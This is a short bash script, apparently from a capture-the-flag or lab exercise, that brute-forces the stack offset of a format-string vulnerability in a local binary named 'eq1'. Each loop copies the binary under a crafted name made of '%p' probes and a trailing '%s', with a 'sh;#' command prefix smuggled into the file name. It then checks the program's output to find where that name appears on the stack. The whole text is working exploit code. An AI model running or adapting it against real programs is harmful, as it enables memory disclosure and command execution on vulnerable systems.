#! /bin/bash

make eq1
for i in $(seq 1 100)
do
	nf=$(perl -e "print 'sh;#AAAABBBB' . ' %p' x $i . ' %s'")
	echo "######################## trying $i"
	cp eq1 "$nf"
	./"$nf" 1 | grep -E "$nf"
	if [ $? -eq 0 ]
	then
		echo "######################## found on location $i"
		break
	fi
	rm "$nf"
done
